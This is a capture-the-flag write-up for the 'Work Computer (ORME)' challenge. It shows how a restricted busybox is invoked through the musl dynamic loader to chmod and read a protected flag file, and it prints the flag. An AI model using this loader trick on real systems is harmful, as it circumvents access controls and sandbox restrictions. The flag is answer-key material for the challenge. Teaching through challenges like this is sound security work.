# Work Computer (ORME)

## Description

With the confidence of conviction and decision making skills that made you a contender for Xenon's Universal takeover
council, now disbanded, you forge ahead to the work computer.   This machine announces itself to you, surprisingly with
a detailed description of all its hardware and peripherals. Your first thought is "Why does the display stand need to
announce its price? And exactly how much does 999 dollars convert to in Xenonivian Bucklets?" You always were one for
the trivialities of things.

Also presented is an image of a fascinating round and bumpy creature, labeled "Cauliflower for cWo" - are "Cauliflowers"
earthlings?  Your 40 hearts skip a beat - these are not the strange unrelatable bipeds you imagined earthings to be..
this looks like your neighbors back home. Such curdley lobes. Will it be at the party?

SarahH, who appears to be  a programmer with several clients, has left open a terminal.  Oops.  Sorry clients!  Aliens
will be poking around attempting to access your networks.. looking for Cauliflower.   That is, *if* they can learn to
navigate such things.

## Solution

From the challenge title it is clear that we have to read the `ORME.flag` file of the [Work Computer challenge](../work_computer/).

```
total 12
drwxrwxrwt    2 0        0               80 Jun 24 07:46 .
drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..
----------    1 1338     1338            33 Jun 24 07:46 ORME.flag
-r--------    1 1338     1338            28 Jun 24 07:46 README.flag
```

Unfortunately, we do not have read permissions for that file. `chmod` is also not available. One way to bypass this is
to call `busybox`. However, this just prints `busybox can not be called for alien reasons.`.

The following command calls `busybox` via the dynamic loader:

```
/lib/ld-musl-x86_64.so.1 /bin/busybox chmod 644 /challenge/ORME.flag
```

Now that the file is readable the [previous exploit](../work_computer/) can be used to print the file. Alternatively
`/lib/ld-musl-x86_64.so.1 /bin/busybox cat /challenge/ORME.flag` also works. This prints the flag
`CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}`.
